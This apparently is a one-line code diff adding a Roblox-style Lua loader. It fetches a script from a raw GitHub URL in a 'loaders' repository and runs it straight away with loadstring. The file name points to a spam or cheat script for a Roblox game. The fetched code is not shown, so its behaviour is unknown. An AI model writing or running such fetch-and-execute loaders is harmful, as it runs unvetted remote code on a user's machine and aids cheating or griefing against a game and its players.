@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/ro-scale-sandbox-spam3-edvc8u6do22yc7.lua"))()
